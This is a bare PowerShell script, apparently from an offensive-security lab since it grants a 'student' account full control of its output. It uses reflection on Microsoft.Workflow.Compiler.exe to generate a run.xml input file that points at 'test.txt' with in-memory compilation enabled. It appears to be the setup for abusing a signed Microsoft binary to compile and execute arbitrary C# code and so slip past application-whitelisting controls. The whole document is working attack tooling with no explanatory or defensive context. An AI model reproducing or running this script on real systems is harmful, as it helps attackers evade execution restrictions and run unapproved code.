$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"

$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)

$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')

Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'

$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters

$compilerparam.GenerateInMemory = $True

$pathvar = "test.txt"
$output = "C:\Tools\run.xml"

$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))

Move-Item $tmp $output

$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl